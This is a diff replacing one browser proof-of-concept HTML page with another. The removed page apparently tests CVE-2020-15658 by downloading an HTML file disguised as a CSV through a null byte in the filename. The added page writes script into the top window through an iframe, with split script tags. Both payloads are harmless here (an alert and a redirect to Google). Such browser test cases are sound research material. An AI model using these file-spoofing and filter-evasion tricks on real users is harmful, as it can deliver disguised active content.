@@ -1,19 +1,14 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h1>Test CVE‑2020‑15658</h1>
-    <button onclick="trigger()">Download Fake CSV</button>
-    <script>
-      function trigger() {
-        const blob = new Blob(
-          ["<html><body><script>alert('hello')</script></body></html>"],
-          { type: "text/html" }
-        );
-        const a = document.createElement("a");
-        a.href = URL.createObjectURL(blob);
-        a.download = "fake.html\u0000.csv";
-        a.dispatchEvent(new MouseEvent("click"));
-      }
-    </script>
-  </body>
-</html>
+<script>
+function loadIframe() {
+	win = open('','_top');
+	win.document.open();
+	win.document.write('data:text/html,<s'+'cript>location="https://www.google.com";</s'+'cript>');
+	win.document.close();
+}
+function go() {
+	var iframe = '<iframe onload="loadIframe();"></iframe>';
+	document.body.innerHTML = iframe;
+	alert(1);
+}
+</script>
+<input type="button" onclick="go()" value="test"/>
